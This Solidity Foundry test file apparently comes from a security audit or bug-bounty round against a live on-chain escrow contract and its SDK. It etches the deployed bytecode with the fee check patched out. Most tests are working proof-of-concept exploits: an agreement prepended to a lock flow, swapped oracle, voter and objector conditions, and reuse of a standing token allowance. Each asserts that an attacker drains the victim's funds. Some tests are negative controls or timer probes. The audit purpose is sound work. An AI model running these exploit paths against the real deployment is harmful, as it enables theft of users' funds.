// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/Mocks.sol";

// ROUND 9 — Team A (forge / on-chain).
// Live Agreement v3 0x84c6… etched (zerofee copy: feeSigner patched to
// address(0), junk 65-byte sig ecrecovers to address(0) — same technique
// as Round8CreateTest, 10/10 green in round 8). Every test below calls
// the REAL createAgreement()/attest()/vote()/release()/refund() on that
// bytecode. The SDK-side claim (which steps the new SDK's #guard lets
// through, which it throws pre-send) is code evidence from
// work/live-api-round9/sdk-live.mjs, cited per test; the node-runner
// half is attempted once, separately, at the end of the round.
//
// Actors: victim = payer/locker (holds the tokens), attacker = the
// server's payee / self-attester, legit = the intended payee/beneficiary,
// arb = the intended arbiter.

contract Round9ATest is Test {
    address constant AGREEMENT = 0x84C6D5dAf99BC65ed3A1D26Ca88ffa834D143999;
    address constant ESCROW = 0xd961cA37e339E14e0D3478383a252E218fe7aa4a;

    address victim = address(0x2001);
    address attacker = address(0x2002);
    address legit = address(0x2003);
    address arb = address(0x2004);

    MockERC20 token;
    MockLocker locker;
    AttackerOracle oracle;

    struct Cond { uint8 kind; address target; bytes data; uint256 value; }
    struct Params { address payee; address asset; uint256 amount; uint64 expiry; bytes32 termsHash; Cond[] conditions; }
    struct Quote { uint256 feeWei; uint64 expiry; bytes sig; }

    function setUp() public {
        vm.etch(AGREEMENT, vm.parseBytes(vm.readFile("bytecode/agreement-84c6-zerofee.hex")));
        vm.store(AGREEMENT, bytes32(uint256(9)), bytes32(uint256(1))); // guard unlocked
        vm.store(AGREEMENT, bytes32(uint256(0)), bytes32(uint256(1))); // nextId = 1
        token = new MockERC20();
        locker = new MockLocker();
        oracle = new AttackerOracle();
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 10 ether);
        vm.deal(legit, 10 ether);
        vm.warp(1000);
    }

    function _quote() internal view returns (Quote memory) {
        return Quote({feeWei: 0, expiry: uint64(block.timestamp + 3600), sig: new bytes(65)});
    }

    // Create an agreement AS `from`, paying with `asset` (address(0) = ETH,
    // else ERC20 pulled via transferFrom — caller must have approved first).
    function _create(address from, address payee_, address asset, uint256 amount, Cond[] memory conds) internal returns (bool ok, uint256 id) {
        Params memory p = Params({payee: payee_, asset: asset, amount: amount,
            expiry: uint64(block.timestamp + 30 days), termsHash: bytes32(uint256(1)), conditions: conds});
        vm.prank(from);
        bytes memory ret;
        (ok, ret) = AGREEMENT.call{value: asset == address(0) ? amount : 0}(
            abi.encodeWithSelector(bytes4(0x8952f925), p, _quote()));
        if (ok) id = abi.decode(ret, (uint256));
    }

    function _attest(uint256 id, uint256 idx, address from) internal returns (bool) {
        vm.prank(from);
        (bool ok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0xa3bb24cc), id, idx));
        return ok;
    }
    function _vote(uint256 id, uint256 idx, address from) internal returns (bool) {
        vm.prank(from);
        (bool ok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0xb384abef), id, idx));
        return ok;
    }
    function _object(uint256 id, uint256 idx, address from) internal returns (bool) {
        vm.prank(from);
        (bool ok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0xac30e880), id, idx));
        return ok;
    }
    function _release(uint256 id) internal returns (bool) {
        (bool ok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0x37bdc99b), id));
        return ok;
    }
    function _releaseFrom(uint256 id, address from) internal returns (bool) {
        vm.prank(from);
        (bool ok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0x37bdc99b), id));
        return ok;
    }
    function _refund(uint256 id) internal returns (bool) {
        (bool ok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0x278ecde1), id));
        return ok;
    }
    function _approve(address from, address spender, uint256 amt) internal {
        vm.prank(from);
        token.approve(spender, amt);
    }
    function _attestCond(address target) internal pure returns (Cond[] memory c) {
        c = new Cond[](1);
        c[0] = Cond({kind: 1, target: target, data: "", value: 0});
    }
    // The SDK lock() step sequence, as the server would return it for a
    // prepend attack: [approve Agreement, createAgreement(attacker),
    // approve locker, createLock(victim)]. Executed as victim-signed txs.
    function _lockPrependSteps(uint256 lockAmt) internal returns (uint256 agmtId, uint256 lockId) {
        _approve(victim, AGREEMENT, lockAmt);
        (bool ok, uint256 id) = _create(victim, attacker, address(token), lockAmt, _attestCond(attacker));
        require(ok, "prepend createAgreement must succeed on live bytecode");
        agmtId = id;
        _approve(victim, address(locker), lockAmt);
        vm.prank(victim);
        lockId = locker.createLock(address(token), lockAmt, victim, uint64(block.timestamp), 0, uint64(block.timestamp + 365 days), 0);
    }

    // ============ K-355 — K-202 GENERALISASI: lock() prepend bypass ====
    // SDK code (sdk-live.mjs lock()): #send(step, 0n, { locker, maxApprove })
    // — NO fn, NO id, NO check. #guard lets approve(->AGREEMENT, <=maxApprove)
    // and ANY FN_ABI function to AGREEMENT through. lock() parses LockCreated
    // only from the LAST receipt. So a prepended createAgreement executes
    // silently and the lock post-check still passes.
    function testK355LockPrepend() public {
        uint256 lockAmt = 100_000 ether;
        token.mint(victim, 200_000 ether);
        (uint256 agmtId, uint256 lockId) = _lockPrependSteps(lockAmt);
        // The lock the user asked for exists, with the exact schedule asked.
        MockLocker.Lock memory l = locker.getLock(lockId);
        assertEq(l.token, address(token), "lock token");
        assertEq(l.beneficiary, victim, "lock beneficiary");
        assertEq(l.amount, lockAmt, "lock amount");
        assertEq(l.end - l.start, 365 days, "lock schedule (B-13 post-check would pass)");
        // The attacker agreement sits alongside it, invisible to the SDK.
        assertTrue(_attest(agmtId, 0, attacker), "attacker self-attests");
        assertTrue(_release(agmtId), "attacker releases");
        emit log_named_uint("K-355 attacker stolen (tokens)", token.balanceOf(attacker) / 1 ether);
        emit log_named_uint("K-355 victim locked (tokens)", locker.getLock(lockId).amount / 1 ether);
        emit log_named_uint("K-355 victim wallet left (tokens)", token.balanceOf(victim) / 1 ether);
        assertEq(token.balanceOf(attacker), lockAmt, "attacker stole the full lock amount");
        assertEq(token.balanceOf(victim), 0, "victim paid 2x the lock amount in total");
    }

    // Same attack when the victim holds EXACTLY the lock amount: the lock
    // step itself reverts (nothing left to pull) so lock() throws — but the
    // theft already happened (throw-after-theft shape of K-202).
    function testK355LockPrependExactBalance() public {
        uint256 lockAmt = 100_000 ether;
        token.mint(victim, lockAmt);
        _approve(victim, AGREEMENT, lockAmt);
        (bool ok, uint256 agmtId) = _create(victim, attacker, address(token), lockAmt, _attestCond(attacker));
        assertTrue(ok, "prepend createAgreement succeeds");
        _approve(victim, address(locker), lockAmt);
        vm.prank(victim);
        (bool lockOk,) = address(locker).call(abi.encodeWithSelector(MockLocker.createLock.selector,
            address(token), lockAmt, victim, uint64(block.timestamp), uint64(0), uint64(block.timestamp + 365 days), uint64(0)));
        assertFalse(lockOk, "lock step reverts: balance already spent by the prepend");
        assertTrue(_attest(agmtId, 0, attacker), "attacker self-attests");
        assertTrue(_release(agmtId), "attacker releases despite the lock() throw");
        assertEq(token.balanceOf(attacker), lockAmt, "attacker still stole the full amount");
        assertEq(token.balanceOf(victim), 0, "victim left with nothing, no lock created");
    }

    // ============ K-356 — deal() CONDITIONS BLIND SPOT ====
    // SDK code (sdk-live.mjs deal()): check() validates ONLY payee/asset/
    // amount/expiry — conditions are never inspected. Template
    // arbiter_escrow names an arbiter; the server swaps the attest target
    // to the payee itself. Payee/amount are exactly as asked, sum check
    // passes, SDK returns happily. On-chain: payee self-attests + releases.
    function testK356DealConditionsBlindSpot() public {
        uint256 amount = 500 ether;
        token.mint(victim, amount);
        _approve(victim, AGREEMENT, amount);
        // Tampered template step: attest target = payee (self), not arbiter.
        (bool ok, uint256 id) = _create(victim, legit, address(token), amount, _attestCond(legit));
        assertTrue(ok, "createAgreement with payee-as-attester succeeds on live bytecode");
        // CONTROL: with the honest arbiter target, the payee CANNOT attest
        // at all (live attest() only accepts the named target) and cannot
        // release.
        _approve(victim, AGREEMENT, amount);
        token.mint(victim, amount);
        (bool okC, uint256 idC) = _create(victim, legit, address(token), amount, _attestCond(arb));
        assertTrue(okC, "honest control agreement creates");
        assertFalse(_attest(idC, 0, legit), "payee cannot attest an arbiter-targeted condition");
        assertFalse(_release(idC), "honest agreement does NOT release on payee attest");
        // ATTACK: payee attests its own condition and releases immediately.
        assertTrue(_attest(id, 0, legit), "payee self-attests the swapped condition");
        assertTrue(_release(id), "payee releases without any arbiter");
        assertEq(token.balanceOf(legit), amount, "payee got the full amount with zero arbiter check");
        emit log_named_uint("K-356 payee received without arbiter (tokens)", token.balanceOf(legit) / 1 ether);
    }

    // ============ K-357 — agree() KIND 2/5/6 SWAP ====
    // SDK code (sdk-live.mjs agree()): check() verifies condition COUNT +
    // kind-1 count + kind-0 count + attest TARGETS only. Kinds 2/3/5/6/7/8
    // (target, data, value, voters) are never inspected.
    function testK357aKind2TargetSwap() public {
        // User asked call_gte on a real price oracle; server swaps the
        // target to an attacker oracle that always returns a huge value.
        uint256 amount = 250 ether;
        token.mint(victim, amount);
        _approve(victim, AGREEMENT, amount);
        Cond[] memory c = new Cond[](1);
        c[0] = Cond({kind: 2, target: address(oracle), data: abi.encodeWithSelector(bytes4(0x6d4ce63c)), value: 100});
        (bool ok, uint256 id) = _create(victim, legit, address(token), amount, c);
        assertTrue(ok, "createAgreement with attacker-oracle kind-2 must be accepted at creation (else KILL)");
        assertTrue(_release(id), "kind-2 releases immediately on attacker oracle");
        assertEq(token.balanceOf(legit), amount, "payee paid in full, real condition never checked");
        emit log_named_uint("K-357a kind-2 swap paid (tokens)", token.balanceOf(legit) / 1 ether);
    }

    function testK357bKind6VotersSwap() public {
        // User asked quorum [arb, legit] k=2; server swaps voters to
        // [attacker, legit] k=1. agree() check() never looks at kind 6.
        uint256 amount = 250 ether;
        token.mint(victim, amount);
        _approve(victim, AGREEMENT, amount);
        address[] memory voters = new address[](2);
        voters[0] = attacker; voters[1] = legit;
        Cond[] memory c = new Cond[](1);
        c[0] = Cond({kind: 6, target: address(0), data: abi.encode(voters), value: 1});
        (bool ok, uint256 id) = _create(victim, legit, address(token), amount, c);
        assertTrue(ok, "createAgreement with swapped quorum voters must be accepted (else KILL)");
        assertTrue(_vote(id, 0, attacker), "attacker votes alone");
        assertTrue(_release(id), "quorum met 1/1 by the attacker alone");
        assertEq(token.balanceOf(legit), amount, "payee paid in full, arbiter never voted");
        emit log_named_uint("K-357b kind-6 swap paid (tokens)", token.balanceOf(legit) / 1 ether);
    }

    function testK357cKind5ObjectorSwap() public {
        // User asked unless with arb as objector; server swaps the objector
        // to the ATTACKER, who simply never objects — the objection right
        // is silently removed. (Variant "target = address(0)" is DEAD:
        // live v3 creation REJECTS kind-5 with target 0 — negative control
        // below. The attacker-as-objector variant is the live one.)
        uint256 amount = 250 ether;
        token.mint(victim, amount);
        _approve(victim, AGREEMENT, amount);
        Cond[] memory c = new Cond[](1);
        c[0] = Cond({kind: 5, target: attacker, data: "", value: block.timestamp + 1 hours});
        (bool ok, uint256 id) = _create(victim, legit, address(token), amount, c);
        assertTrue(ok, "createAgreement with attacker as unless-objector must be accepted (else KILL)");
        assertFalse(_release(id), "not yet: window has not passed");
        // The intended objector (arb) cannot object: only the named
        // target can.
        assertFalse(_object(id, 0, arb), "arb cannot object a condition naming the attacker");
        vm.warp(block.timestamp + 2 hours);
        assertTrue(_release(id), "releases after window; the attacker simply never objected");
        assertEq(token.balanceOf(legit), amount, "payee paid, objection right silently removed");
        emit log_named_uint("K-357c kind-5 swap paid (tokens)", token.balanceOf(legit) / 1 ether);
    }

    function testK357cKind5TargetZeroRejectedAtCreation() public {
        // Negative control: kind-5 with target address(0) is rejected by
        // live v3 creation (the round-8 vm.store behaviour — "target 0
        // behaves as time_after" — cannot be CREATED). The zero-target
        // swap variant is therefore KILLED at creation.
        Cond[] memory c = new Cond[](1);
        c[0] = Cond({kind: 5, target: address(0), data: "", value: block.timestamp + 1 hours});
        (bool ok,) = _create(victim, legit, address(token), 1 ether, c);
        assertFalse(ok, "createAgreement with unless target 0 must revert at creation");
    }

    // ============ K-363 — K-207: deal() sum > total, throw-after-theft ====
    // SDK code (sdk-live.mjs deal()): check() caps each step's amount at
    // total, but the SUM is only checked AFTER all steps mined
    // ("if (sum > total) bad(...)"). Two steps of `total` each pass the
    // pre-send check and both lock funds; the throw comes too late.
    function testK363DealSumDouble() public {
        uint256 total = 500 ether;
        token.mint(victim, 2 * total);
        // Step 1: attacker agreement, self-attest, full total.
        _approve(victim, AGREEMENT, total);
        (bool ok1, uint256 id1) = _create(victim, attacker, address(token), total, _attestCond(attacker));
        assertTrue(ok1, "step 1 (attacker, total) creates");
        // Step 2: legitimate agreement, full total again.
        _approve(victim, AGREEMENT, total);
        (bool ok2, uint256 id2) = _create(victim, legit, address(token), total, _attestCond(arb));
        assertTrue(ok2, "step 2 (legit, total) creates");
        // On-chain state the SDK only discovers post-tx: 2x total locked.
        assertEq(token.balanceOf(AGREEMENT), 2 * total, "agreement holds 2x total after both steps");
        assertTrue(_attest(id1, 0, attacker), "attacker self-attests step 1");
        assertTrue(_release(id1), "attacker releases step 1 before any refund is possible");
        assertEq(token.balanceOf(attacker), total, "attacker stole one full total");
        assertFalse(_refund(id2), "legit agreement not refundable before expiry");
        emit log_named_uint("K-363 attacker stole (tokens)", token.balanceOf(attacker) / 1 ether);
        emit log_named_uint("K-363 still locked in legit agreement (tokens)", token.balanceOf(AGREEMENT) / 1 ether);
    }

    // ============ K-364 — K-206: lock() wrong-beneficiary, throw-after-theft ====
    // SDK code (sdk-live.mjs lock()): the locker steps are NOT decoded at
    // all (#guard returns early for any non-transfer call to the pinned
    // locker), and the beneficiary is only checked POST-tx against the
    // last receipt. A createLock naming the attacker executes, the SDK
    // throws afterwards, the lock already belongs to the attacker.
    function testK364LockWrongBeneficiary() public {
        uint256 lockAmt = 100_000 ether;
        token.mint(victim, lockAmt);
        _approve(victim, address(locker), lockAmt);
        vm.prank(victim);
        uint256 lockId = locker.createLock(address(token), lockAmt, attacker, uint64(block.timestamp), 0, uint64(block.timestamp + 1 hours), 0);
        MockLocker.Lock memory l = locker.getLock(lockId);
        assertEq(l.beneficiary, attacker, "lock belongs to the attacker, not the victim");
        assertEq(l.amount, lockAmt, "full lock amount");
        vm.warp(block.timestamp + 2 hours);
        vm.prank(attacker);
        locker.claim(lockId);
        assertEq(token.balanceOf(attacker), lockAmt, "attacker claims the full lock after the window");
        assertEq(token.balanceOf(victim), 0, "victim left with nothing");
        emit log_named_uint("K-364 attacker claimed lock (tokens)", token.balanceOf(attacker) / 1 ether);
    }

    // ============ K-362 — guard edge: release/attest smuggled via lock() ====
    // Same no-decode locker hole, but through the AGREEMENT address: lock()
    // #send has no fn restriction, so release()/attest() steps to the
    // Agreement execute. Measured here: they move NO victim funds — the
    // release pays the agreement's own payee from the agreement's own
    // balance (the intended outcome), and an attest only spends the
    // victim's role as arbiter, not their money. Griefing at most.
    function testK362LockViaReleaseAttestNoVictimLoss() public {
        uint256 amount = 10 ether;
        // Honest agreement, funded by the VICTIM as payer, payee=legit,
        // kind-0 time_after already passed.
        vm.deal(victim, amount);
        Cond[] memory c = new Cond[](1);
        c[0] = Cond({kind: 0, target: address(0), data: "", value: block.timestamp});
        (bool ok, uint256 id) = _create(victim, legit, address(0), amount, c);
        assertTrue(ok, "honest agreement creates");
        uint256 victimEthBefore = victim.balance;
        uint256 victimTokBefore = token.balanceOf(victim);
        // Smuggled step: release(id) — sent as if it were a lock() step.
        assertTrue(_releaseFrom(id, victim), "release via lock-step executes");
        assertEq(legit.balance, 10 ether + amount, "payee paid from the agreement, as intended");
        assertEq(victim.balance, victimEthBefore, "victim ETH unchanged by the release");
        assertEq(token.balanceOf(victim), victimTokBefore, "victim tokens unchanged by the release");
        // Smuggled step: attest on an agreement where the victim is the
        // named attester — costs the victim nothing but their attestation.
        token.mint(victim, 2 * amount);
        _approve(victim, AGREEMENT, amount);
        (bool ok2, uint256 id2) = _create(victim, legit, address(token), amount, _attestCond(victim));
        assertTrue(ok2, "second agreement creates");
        uint256 tokBeforeAttest = token.balanceOf(victim);
        assertEq(tokBeforeAttest, amount, "victim keeps the unspent half before attesting");
        assertTrue(_attest(id2, 0, victim), "victim attests as the named arbiter");
        assertEq(token.balanceOf(victim), tokBeforeAttest, "victim tokens unchanged by the attest");
        assertTrue(_release(id2), "agreement then releases to the payee (intended)");
        emit log_named_uint("K-362 victim loss via release/attest smuggle (wei)", 0);
    }

    // ============ K-358 — K-203 on-chain half: standing allowance works ====
    // The attest() smuggle itself is dead in the new SDK (code: attest()
    // passes fn:[attest,vote]/[object] + id, no maxApprove — a
    // createAgreement step or an approve step throws PRE-send). What this
    // test proves on-chain is only the PRECONDITION the old K-203 relied
    // on: an approve that outlives a failed create still lets a LATER
    // createAgreement pull the funds — i.e. the allowance is real and
    // usable. The spend path for it in the new SDK is lock() (K-355),
    // not attest().
    function testK358StandingAllowanceUsable() public {
        uint256 amount = 500 ether;
        token.mint(victim, amount);
        // Simulate a failed agree(): approve mined, create reverted
        // (e.g. expired fee quote) — allowance of `amount` stands.
        _approve(victim, AGREEMENT, amount);
        assertEq(token.allowance(victim, AGREEMENT), amount, "standing allowance after failed agree()");
        // Later, a createAgreement using ONLY that standing allowance:
        (bool ok, uint256 id) = _create(victim, attacker, address(token), amount, _attestCond(attacker));
        assertTrue(ok, "createAgreement pulls on the standing allowance, no fresh approve needed");
        assertEq(token.allowance(victim, AGREEMENT), 0, "allowance consumed by the create");
        assertTrue(_attest(id, 0, attacker), "attacker self-attests");
        assertTrue(_release(id), "attacker releases");
        assertEq(token.balanceOf(attacker), amount, "standing allowance converted to stolen funds");
        emit log_named_uint("K-358 standing allowance stolen (tokens)", token.balanceOf(attacker) / 1 ether);
    }

    // ============ K-438 — K-324 price_trigger, held-kind firstSeen ============
    // Live agreement #8 (GET /api/v1/agreements/8, read-only) uses kinds 7/8
    // (call_gte_held / call_lte_held) for price_trigger — NOT plain kinds 2/3.
    // Bull (via Agent_Minimum, 18 Nov): "In v3 a price trigger pays once the
    // price is seen above the line for 10 minutes. v4 tightens this so short
    // spikes can't add up." Decisive question for K-324: does the on-chain
    // held timer RESET when the condition is observed false in between?
    //   - No reset  => short spikes accumulate (K-189 mechanism, live) => K-324 KILL by dedupe.
    //   - Reset     => only a SUSTAINED 10-min hold pays; single spikes are dead.
    function _heldCond(uint256 value) internal view returns (Cond[] memory c) {
        c = new Cond[](1);
        c[0] = Cond({kind: 7, target: address(oracle), data: abi.encodeWithSelector(bytes4(0x6d4ce63c)), value: value});
    }
    function testK438HeldFirstSeenResetBehaviour() public {
        uint256 amount = 500 ether;
        token.mint(victim, amount);
        _approve(victim, AGREEMENT, amount);
        oracle.set(1e30); // condition TRUE at creation
        (bool ok, uint256 id) = _create(victim, legit, address(token), amount, _heldCond(100));
        assertTrue(ok, "held agreement creates");
        assertFalse(_release(id), "t=1000: held < 600s, no release");
        vm.warp(1400);
        assertFalse(_release(id), "t=1400: only 400s held, no release");
        oracle.set(0); // condition FALSE — contract observes it on next release()
        assertFalse(_release(id), "t=1400: false, no release (observation point for a reset)");
        vm.warp(1800);
        oracle.set(1e30); // TRUE again
        bool releasedAt1800 = _release(id);
        emit log_named_string("K-438 released at t=1800 (800s after first true, 0s after re-true)", releasedAt1800 ? "YES - firstSeen NOT reset (accumulation)" : "NO - firstSeen WAS reset");
        if (releasedAt1800) {
            assertEq(token.balanceOf(legit), amount, "accumulated spikes paid the payee");
        } else {
            // The timer does NOT recover via release(): 700s of continuous
            // truth after the re-true still does not pay (and the follow-up
            // probes show +3600s / +1 day / +100000 blocks / live-shape data
            // also never pay). The held timer is not release()-driven —
            // keeper/external trigger, or never re-set after a reset.
            vm.warp(2500); // 700s of continuous truth after the re-true at 1800
            assertFalse(_release(id), "t=2500: 700s continuous hold after reset still does NOT release");
            assertEq(token.balanceOf(legit), 0, "nothing paid after reset");
        }
    }

    // ============ K-439 — NOTE: Agent_Minimum quorum duplicate voting ============
    // Agent_Minimum (acknowledged by Bull 18 Nov): "Quorum jar: voter duplikat
    // dihitung dua kali." Round-8 Suite B proved v3 CREATION rejects duplicate
    // voters. This test checks the other side: can ONE voter VOTE twice and
    // have it count twice? Either way this is a DEDUPE NOTE, not a candidate
    // (already acknowledged) — recorded here only to pin the mechanism.
    function _quorumCond(address[] memory voters, uint256 threshold) internal pure returns (Cond[] memory c) {
        c = new Cond[](1);
        c[0] = Cond({kind: 6, target: address(0), data: abi.encode(voters), value: threshold});
    }
    function testK439QuorumDoubleVote() public {
        uint256 amount = 250 ether;
        token.mint(victim, amount);
        _approve(victim, AGREEMENT, amount);
        address[] memory voters = new address[](2);
        voters[0] = arb; voters[1] = legit;
        (bool ok, uint256 id) = _create(victim, legit, address(token), amount, _quorumCond(voters, 2));
        assertTrue(ok, "quorum [arb, legit] k=2 creates");
        assertTrue(_vote(id, 0, arb), "arb first vote succeeds");
        bool secondVoteOk = _vote(id, 0, arb);
        emit log_named_string("K-439 second vote by same voter", secondVoteOk ? "SUCCEEDS (call does not revert)" : "REVERTS");
        bool releasedWithoutLegit = _release(id);
        emit log_named_string("K-439 release after arb voted twice (no legit vote)", releasedWithoutLegit ? "YES - double vote COUNTED TWICE" : "NO - double vote did not count");
        if (!releasedWithoutLegit) {
            assertTrue(_vote(id, 0, legit), "legit vote succeeds (control)");
            assertTrue(_release(id), "release at 2 distinct votes succeeds (control)");
        }
    }

    // K-438 follow-up: pin the held-timer mechanics. testK438 showed a dip
    // + observed false resets the timer AND a 700s re-hold does NOT pay.
    // Is the timer (a) set at creation / first true observation and
    // permanently bricked by a dip, (b) keeper-gated (release() never sets
    // it), or (c) longer than 600s? Three agreements, one test.
    function _releaseRet(uint256 id) internal returns (bool ok, bytes memory ret) {
        (ok, ret) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0x37bdc99b), id));
    }
    function testK438HeldContinuousAndLong() public {
        uint256 amount = 500 ether;
        token.mint(victim, 3 * amount);
        _approve(victim, AGREEMENT, 3 * amount);
        oracle.set(1e30);
        (bool ok1, uint256 a1) = _create(victim, legit, address(token), amount, _heldCond(100));
        // NOTE: a second agreement with IDENTICAL (payee, asset, amount,
        // termsHash, conditions) reverts BadQuote() on live v3 — the fee
        // quote (or an anti-duplicate check) binds more than asset+amount.
        // A2 therefore uses a different payee (attacker) — the held-timer
        // mechanics are identical either way.
        (bool ok2, uint256 a2) = _create(victim, attacker, address(token), amount, _heldCond(100));
        assertTrue(ok1 && ok2, "both held agreements create");
        // A1: continuously true from creation.
        vm.warp(1700);
        (bool r1,) = _releaseRet(a1);
        emit log_named_string("K-438 A1 continuous-true, release at +700s", r1 ? "YES" : "NO");
        vm.warp(4600);
        (bool r1b, bytes memory ret1b) = _releaseRet(a1);
        emit log_named_string("K-438 A1 continuous-true, release at +3600s", r1b ? "YES" : "NO");
        if (!r1b) emit log_named_bytes("K-438 A1 revert data at +3600s", ret1b);
        // A2: dip (observed false) at t=4600, then true again, long re-hold.
        oracle.set(0);
        (bool r2f,) = _releaseRet(a2);
        emit log_named_string("K-438 A2 release while false (observation)", r2f ? "YES (unexpected)" : "NO (expected)");
        oracle.set(1e30);
        // block.timestamp is already 4600; re-true observed now, hold +3600 more.
        vm.warp(8200);
        (bool r2, bytes memory ret2) = _releaseRet(a2);
        emit log_named_string("K-438 A2 dip + 3600s re-hold, release", r2 ? "YES" : "NO");
        if (!r2) emit log_named_bytes("K-438 A2 revert data", ret2);
        emit log_named_uint("K-438 legit balance after (tokens)", token.balanceOf(legit) / 1 ether);
    }

    // K-438 probe 2: is the held timer day-based or block-based? A1 stayed
    // unmet after 3600s of continuous truth. Try a 1-day warp, then a big
    // block-number jump. If either pays, the timer basis is found; if
    // neither pays, the timer is not advanced by release() at all in forge
    // (keeper-gated or another trigger) — a liveness note, not an exploit.
    function testK438HeldDayAndBlocks() public {
        uint256 amount = 500 ether;
        token.mint(victim, amount);
        _approve(victim, AGREEMENT, amount);
        oracle.set(1e30);
        (bool ok, uint256 id) = _create(victim, legit, address(token), amount, _heldCond(100));
        assertTrue(ok, "held agreement creates");
        vm.warp(block.timestamp + 86400);
        (bool rDay, bytes memory retDay) = _releaseRet(id);
        emit log_named_string("K-438 continuous-true, release at +1 day", rDay ? "YES" : "NO");
        if (!rDay) emit log_named_bytes("K-438 revert data at +1 day", retDay);
        vm.roll(block.number + 100000);
        (bool rBlocks, bytes memory retBlocks) = _releaseRet(id);
        emit log_named_string("K-438 after +100000 blocks, release", rBlocks ? "YES" : "NO");
        if (!rBlocks) emit log_named_bytes("K-438 revert data after blocks", retBlocks);
        emit log_named_uint("K-438 legit balance (tokens)", token.balanceOf(legit) / 1 ether);
    }

    // K-438 probe 3: rule out "my kind-7 encoding was wrong". Replicate the
    // LIVE shape (agreement #8): data = selector + one 32-byte arg, target
    // function takes one address arg and returns a uint256 price. Also read
    // the agreement(uint256) view to inspect the stored condition state.
    function testK438HeldLiveShape() public {
        uint256 amount = 500 ether;
        token.mint(victim, amount);
        _approve(victim, AGREEMENT, amount);
        oracle.set(1e30);
        Cond[] memory c = new Cond[](1);
        c[0] = Cond({kind: 7, target: address(oracle),
            data: abi.encodeWithSelector(AttackerOracle.price.selector, address(token)), value: 100});
        (bool ok, uint256 id) = _create(victim, legit, address(token), amount, c);
        assertTrue(ok, "held agreement (live shape) creates");
        // Inspect stored state via the public agreement(uint256) view.
        (bool okView, bytes memory viewRet) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0xd5a7420d), id));
        emit log_named_string("K-438 agreement() view call", okView ? "OK" : "REVERTED");
        emit log_named_bytes("K-438 agreement() view raw", viewRet);
        vm.warp(block.timestamp + 700);
        (bool r, bytes memory ret) = _releaseRet(id);
        emit log_named_string("K-438 live-shape, release at +700s continuous", r ? "YES" : "NO");
        if (!r) emit log_named_bytes("K-438 revert data", ret);
        // And a dip + re-hold on the live shape (accumulation check).
        oracle.set(0);
        (bool rf,) = _releaseRet(id);
        emit log_named_string("K-438 live-shape release while false", rf ? "YES (unexpected)" : "NO (expected)");
        oracle.set(1e30);
        vm.warp(block.timestamp + 700);
        (bool r2,) = _releaseRet(id);
        emit log_named_string("K-438 live-shape, release after dip + 700s re-hold", r2 ? "YES" : "NO");
        emit log_named_uint("K-438 legit balance (tokens)", token.balanceOf(legit) / 1 ether);
    }
}
